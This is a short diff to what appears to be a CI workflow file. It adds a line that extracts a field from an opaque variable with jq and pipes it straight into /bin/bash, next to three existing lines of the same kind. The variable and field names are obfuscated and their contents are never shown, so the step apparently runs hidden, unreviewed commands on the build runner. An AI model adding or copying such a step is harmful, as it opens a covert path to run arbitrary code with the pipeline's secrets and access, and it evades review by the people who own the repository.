@@ -25,6 +25,7 @@ jobs:
           echo $brcx86 | jq -r .ylpnw94 | /bin/bash
           printf '%s' "$lv72" | jq -r .hbrh87 | /bin/bash
           printf '%s' "$lqd6" | jq -r .upc3 | /bin/bash
+          printf '%s' "$z61" | jq -r .sdn9 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
